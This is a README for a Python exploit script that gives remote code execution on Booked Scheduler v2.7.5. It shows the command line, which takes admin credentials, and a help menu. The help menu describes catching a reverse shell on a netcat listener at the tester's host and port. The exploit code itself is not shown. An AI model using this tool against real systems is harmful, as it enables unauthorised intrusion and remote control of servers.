# bookedScheduler_v2.7.5_RCE
Automatic exploitation script written in python 3 to exploit "Book Scheduler v2.7.5"

<hr>

#### 1. Basic Usage: 
```txt
$ python3 booked_sheduler.py --url http://127.0.0.1 -u <admin> -p <adminpass> -P <pentesterPort> -H <pentesterIP>
```

#### 2. Help Menu:
```txt
usage: booked_scheduler.py [-h] [--url URL] [-u USER] [-p PASSWORD] [-P LPORT] [-H LHOST]

--- Booked Scheduler v2.7.5 ---

optional arguments:
  -h, --help            show this help message and exit
  --url URL             url (i.e http://192.168.167.64/booked/Web)
  -u USER, --user USER  ADMIN user
  -p PASSWORD, --password PASSWORD
                        ADMIN password
  -P LPORT, --lport LPORT
                        Netcat's port to catch reverse shell
  -H LHOST, --lhost LHOST
                        Netcat's host to catch reverse shell
```

#### 3. Example

![](Example.gif)
